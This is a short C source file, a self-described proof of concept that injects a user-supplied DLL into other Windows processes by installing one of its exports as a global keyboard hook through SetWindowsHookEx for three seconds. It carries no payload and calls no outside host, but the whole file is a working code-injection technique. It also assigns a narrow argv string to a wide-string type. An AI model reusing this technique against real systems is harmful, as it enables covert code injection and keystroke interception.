/*
Simple Poc of injecting a dll by exploit Windows Hook events
*/

#include <windows.h>
#include <stdio.h>


typedef int (__cdecl* MsgBox)();

int main (int argc, char* argv[]){

    HMODULE hMyDll;
    MsgBox BoxCaller;
    HHOOK hHook;

    if (argc<2){
        printf("[!]Usage %s <path-to-dll>",argv[0]);
        return 1;
    }

    LPCWSTR DllPath = argv[1];
    
    hMyDll = LoadLibrary(DllPath);

    BoxCaller = (MsgBox)GetProcAddress(hMyDll,"BoxFunc");

    /*
        HHOOK SetWindowsHookExA(
            [in] int       idHook,
            [in] HOOKPROC  lpfn,
            [in] HINSTANCE hmod,
            [in] DWORD     dwThreadId
        );
    */

    hHook = SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)BoxCaller,hMyDll,0);

    Sleep(3000);
    UnhookWindowsHookEx(hHook);

    return 0; 
}